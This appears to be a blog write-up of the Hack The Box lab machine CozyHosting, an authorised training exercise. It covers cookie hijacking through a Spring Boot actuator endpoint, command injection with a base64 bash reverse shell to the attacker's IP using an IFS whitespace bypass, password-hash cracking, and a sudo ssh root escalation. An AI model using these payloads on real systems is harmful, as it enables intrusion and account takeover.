<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: CozyHosting</title>
<meta name=description content="Platform: Hack The Box Link: CozyHosting Level: Easy OS: Linux CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-cozyhosting/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: CozyHosting"><meta property="og:description" content="Platform: Hack The Box Link: CozyHosting Level: Easy OS: Linux CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: CozyHosting"><meta name=twitter:description content="Platform: Hack The Box Link: CozyHosting Level: Easy OS: Linux CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-cozyhosting/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-cozyhosting/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-cozyhosting/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-cozyhosting/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: CozyHosting</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>March 2, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/CozyHosting>CozyHosting</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p>CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection and the root is accessed by abusing the SSH binary.</p><p>The target IP address is <code>10.10.11.230</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
</code></pre><ul><li>We have a Linux machine</li><li>Running a web application on port 80</li><li>The SSH service is enabled on the target</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-02-26 11:21 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> cozyhosting.htb <span style=color:#56b6c2>(</span>10.10.11.230<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.046s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>reset<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Cozy Hosting - Home
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.53 seconds
</span></span></code></pre></div><p>Let&rsquo;s add the target to our host directory by adding <code>10.10.11.230 cozyhosting.htb</code> to the <code>/etc/hosts</code> file.</p><h2 id=enumeration>Enumeration</h2><p>We check the application by visiting <code>http://cozyhosting.htb</code>. This is a hosting service, the <code>Home</code>, <code>Services</code>, and <code>Pricing</code> links don&rsquo;t do anything special.</p><p><img src=/images/HTB-CozyHosting/cozyhosting.png alt=cozyhosting-website></p><p>The <code>Login</code> button leads you to a login page with url <code>cozyhosting.htb/login</code>.</p><p><img src=/images/HTB-CozyHosting/cozyhosting-login.png alt=cozyhosting-login-form></p><p>First we use <code>Gobuster</code> to find any potential hidden directories, I am using <a href=https://github.com/danielmiessler/SecLists>SecLists</a>.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
</code></pre><p><img src=/images/HTB-CozyHosting/gobuster-medium.png alt=cozyhosting-Gobuster></p><p><code>/admin</code> and <code>/logout</code> sends you to the login page. With <code>/error</code> you get to a page with this message.</p><p><img src=/images/HTB-CozyHosting/whitelabel-error.png alt=cozyhosting-error-page></p><p>I don&rsquo;t know what this error means so I google it and I learn that it is a Spring Boot error. Reading more about it I discover that it indicates that the Spring Boot application does not have a specific endpoint or route defined for handling the <code>/error</code> path and that they might be more endpoints in the application.</p><blockquote><p>Check this stackoverflow page <a href=https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error>Whitelabel Error Page</a></p></blockquote><p>I go back to gobuster for a more specific directory enumeration. SecLists has a list for spring boot that we can use.</p><pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
</code></pre><p><img src=/images/HTB-CozyHosting/gobuster-springboot.png alt=cozyhosting-Gobuster-spring-boot></p><p>We discover more directories, after testing all of them I find what looks like a cookie for the user <code>kanderson</code> in <code>/actuator/sessions</code>.</p><p><img src=/images/HTB-CozyHosting/cookie.png alt=cozyhosting-cookie></p><p>I go back to the login page and try to use it. I use some random values for <code>Username</code> and <code>Password</code> to generate a cookie. Then I replace my cookie value with the one I just found and refresh the page.</p><p>I now have access to the Dashboard of the user.</p><p><img src=/images/HTB-CozyHosting/Dashboard.png alt=cozyhosting-dashboard></p><p>There is another input field, it seems to be working with some SSH key files.</p><p><img src=/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png alt=cozyhosting-SSH-note></p><p>I use Burp Suite to capture the request. I try <code>cozyhosting:test</code> and I get that the <code>host key verification failed</code>. After I submit a <code>hostname</code> and <code>username</code> the form makes a request to the endpoint <code>/executessh</code>.</p><p><img src=/images/HTB-CozyHosting/host-key-verification-fail.png alt=cozyhosting-host-key-failure></p><p>I can also see in that the application is trying to execute some bash commands and I get an error created when <code>/bin/bash -c</code> is executed.</p><p><img src=/images/HTB-CozyHosting/binbash-error.png alt=cozyhosting-bash-error></p><h2 id=initial-foothold>Initial Foothold</h2><p>Now I know that some bash command is being executed I can try to get a reverse shell through this process.</p><p>I used this command to generate my payload in base64.</p><pre tabindex=0><code>echo &#34;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&#34; | base64 -w 0
</code></pre><p><img src=/images/HTB-CozyHosting/payload-generated.png alt=cozyhosting-payload></p><p><strong>Setup a netcat listener before attempting to login.</strong></p><pre tabindex=0><code>nc -nvlp &lt;YOUR-PORT-NUMBER&gt;
</code></pre><p>I try to login with <code>cozyhosting</code> as the hostname and for the username I use the command below (I am using my base64 payload generated earlier with the <code>echo</code> command).</p><pre tabindex=0><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg==&#34;
</code></pre><p>I get a message saying that <code>Username can't contain whitespaces!</code>. I then use the bash parameter <code>{IFS%??}</code> to remove spaces from the payload.</p><pre tabindex=0><code>;echo${IFS%??}&#34;&lt;your payload here&gt;&#34;${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
</code></pre><p>After using the new payload I get a reverse shell!</p><p><img src=/images/HTB-CozyHosting/rev-shell.png alt=cozyhosting-reverse-shell></p><p>We can make the shell stable with these commands</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
</code></pre><p><img src=/images/HTB-CozyHosting/stable-shell.png alt=cozyhosting-stable-shell></p><blockquote><p>Do not worry if you cannot see the prompt after running the last command, just press <code>Enter</code> and everything will come back.</p></blockquote><p>We find an archive on the target system, let&rsquo;s download it.</p><p>I set up a server on the target</p><pre tabindex=0><code>python3 -m http.server 8000
</code></pre><p>On my attack machine I run</p><pre tabindex=0><code>wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
</code></pre><p>Unzip the archive with</p><pre tabindex=0><code>unzip cloudhosting-0.0.1.jar
</code></pre><p>I search through it with <code>grep -r password *</code> and I get some matches. I see that there is a password in <code>BOOT-INF/classes/application.properties</code>.</p><p><img src=/images/HTB-CozyHosting/password-location-springboot.png alt=cozyhosting-password-in-archive></p><p>I output the content of the file on the terminal and I get a username on top of the password for a PostgreSQL database.</p><p><img src=/images/HTB-CozyHosting/postgres-credentials.png alt=cozyhosting-full-credentials></p><p>We log in PostgreSQL with</p><pre tabindex=0><code>psql -h 127.0.0.1 -U postgres
</code></pre><p>Then we connect to the database with</p><pre tabindex=0><code>\c cozyhosting
</code></pre><p><img src=/images/HTB-CozyHosting/postgres-loggedin.png alt=cozyhosting-db-login></p><p>I then list the tables of the database with <code>\d</code>.</p><p><img src=/images/HTB-CozyHosting/db-tables.png alt=cozyhosting-db-tables></p><p>I then run <code>select * from users;</code>, with this command PostgreSQL will retrieve all rows and all columns from the &ldquo;users&rdquo; table and return them as a result set. This query is commonly used to view the contents of a table and can be very useful for inspecting the data stored in the database.</p><p>We find some hashes.</p><p><img src=/images/HTB-CozyHosting/db-hashes.png alt=cozyhosting-db-hashes></p><p>Let&rsquo;s what type of hash this is (of course we are interested in the admin hash we are already logged in as kanderson).</p><pre tabindex=0><code>hashid &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; 
</code></pre><p><img src=/images/HTB-CozyHosting/hashid.png alt=cozyhosting-hash-ID></p><h3 id=lateral-movement>Lateral Movement</h3><p>Let&rsquo;s try to crack the hash. First I get it into a file.</p><pre tabindex=0><code>echo &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; &gt; hash.txt
</code></pre><blockquote><p>If you don&rsquo;t want to use <code>John</code>, use this website <a href=https://hashes.com/en/decrypt/hash>hashes.com</a></p></blockquote><pre tabindex=0><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre><p>I get the password <code>manchesterunited</code>.</p><p>Back on the reverse shell, I run <code>ls -la /home</code> and you I see another directory own by the user <code>josh</code>.</p><p><img src=/images/HTB-CozyHosting/home-listing.png alt=cozyhosting-home-content></p><p>I switch to the <code>josh</code> user with <code>su josh</code> with the password we just cracked. I check his home directory with <code>cd $home</code> and find the flag <code>user.txt</code> there!</p><p><img src=/images/HTB-CozyHosting/userflag.png alt=cozyhosting-user-flag></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>I use <code>sudo -l</code> to see what this user can run.</p><p><img src=/images/HTB-CozyHosting/sudo-l-josh.png alt=cozyhosting-sudo-l></p><p>I go to <a href=https://gtfobins.github.io/gtfobins/ssh/#sudo>GTFObins</a> to find some ssh root shells commands and I use</p><pre tabindex=0><code>sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
</code></pre><p><img src=/images/HTB-CozyHosting/priv-escalation.png alt=cozyhosting-privilege-escalation></p><p>The shell is not optimal you can run this command to get a proper one</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>All you need to do now is <code>cd $home</code> and you will find the <code>root.txt</code> flag.</p><p><img src=/images/HTB-CozyHosting/rootflag-1.png alt=cozyhosting-privilege-escalation></p><p>Thanks for checking my writeup, feel free to comment or reach out to me on on X <a href=https://twitter.com/_KScorpio>@_KScorpio</a> if you have any questions.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-visual/>&#8592;
Previous:
HTB: Visual</a></p><p class=prev-post-date>February 24, 2024</p></div><div class=next-post><p><a href=/posts/htb-manager/>Next:
HTB: Manager
&#8594;</a></p><p class=next-post-date>March 15, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#lateral-movement>Lateral Movement</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>